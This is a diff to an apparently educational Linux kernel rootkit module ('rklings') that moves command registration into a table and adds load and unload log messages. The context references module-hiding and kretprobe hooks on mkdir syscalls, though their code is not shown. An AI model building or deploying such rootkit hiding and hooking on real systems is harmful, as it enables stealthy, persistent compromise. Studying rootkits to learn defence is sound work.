@@ -17,14 +17,16 @@ static int cmd_status(const char *arg)
 	return 0;
 }
 
+static const struct rk_cmd_entry init_cmds[] = {
+	{ "ping",   cmd_ping },
+	{ "status", cmd_status },
+};
+
 static int __init rk_init(void)
 {
 	int ret;
 
-	ret = rk_cmd_register("ping", cmd_ping);
-	if (ret)
-		return ret;
-	ret = rk_cmd_register("status", cmd_status);
+	ret = rk_cmds_register(init_cmds, ARRAY_SIZE(init_cmds));
 	if (ret)
 		return ret;
 
@@ -32,7 +34,7 @@ static int __init rk_init(void)
 	if (ret)
 		return ret;
 
-	ret = rk_module_init();
+	ret = rk_module_cmds_init();
 	if (ret)
 		return ret;
 
@@ -44,6 +46,7 @@ static int __init rk_init(void)
 	if (ret)
 		goto fail_mkdirat;
 
+	pr_info("rklings: loaded\n");
 	return 0;
 
 fail_mkdirat:
@@ -56,6 +59,7 @@ static void __exit rk_exit(void)
 	rk_module_unhide();
 	unregister_kretprobe(&rk_mkdirat_probe);
 	unregister_kretprobe(&rk_mkdir_probe);
+	pr_info("rklings: unloaded\n");
 }
 
 module_init(rk_init);
